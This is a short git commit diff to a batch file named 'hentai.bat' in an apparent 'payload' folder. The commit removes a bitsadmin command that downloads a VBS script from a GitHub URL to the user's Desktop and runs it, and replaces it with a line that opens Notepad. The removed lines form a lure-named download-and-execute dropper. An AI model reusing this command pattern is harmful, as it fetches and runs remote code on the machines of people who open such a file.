73c6ce350a19bb139673ce5dce0aba1ecfbd2880
Phoenixthrush <phoenixthrush_business@hotmail.com>
2021-05-29 00:26:44 +0200

    Update hentai.bat

--- phoenixzoo/payload/hentai.bat
+++ phoenixzoo/payload/hentai.bat
@@ -1,2 +1,1 @@
-bitsadmin /transfer mydownloadjob /download /priority foreground "https://github.com/Phoenixthrush/phoenixthrush.github.io/blob/master/phoenixzoo/payload/license.vbs" "%userprofile%\Desktop\license.vbs"
-start %userprofile%\Desktop\license.vbs
+notepad.exe
